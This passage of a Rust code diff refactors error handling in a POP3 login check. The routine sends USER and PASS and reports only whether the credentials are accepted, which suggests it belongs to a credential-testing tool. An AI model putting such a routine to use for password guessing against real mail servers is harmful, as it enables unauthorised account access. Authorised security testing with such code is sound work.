             stream.write_all(b"QUIT\r\n").ok();
             return Ok(true);
         }
     } else {
-        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
-        let mut stream = TcpStream::connect_timeout(&socket_addr, timeout)?;
-        stream.set_read_timeout(Some(timeout))?;
-        stream.set_write_timeout(Some(timeout))?;
-        
-         // Read banner
+        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?
+            .next()
+            .ok_or_else(|| Pop3Error { error_type: Pop3ErrorType::ConnectionRefused, message: "Resolution failed".to_string() })?;
+        let mut stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        let _ = stream.set_nodelay(true);
+        stream.set_read_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        stream.set_write_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+
+        // Read banner
         let mut buffer = [0; 1024];
-        stream.read(&mut buffer)?; 
-        
-        stream.write_all(format!("USER {}\r\n", user).as_bytes())?;
-        let n = stream.read(&mut buffer)?;
+        stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+
+        stream.write_all(format!("USER {}\r\n", user).as_bytes())
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
         if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
             return Ok(false);
         }
-        
-        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())?;
-        let n = stream.read(&mut buffer)?;
+
+        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
         if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
             stream.write_all(b"QUIT\r\n").ok();
             return Ok(true);
         }
     }
-    
+
     Ok(false)
 }
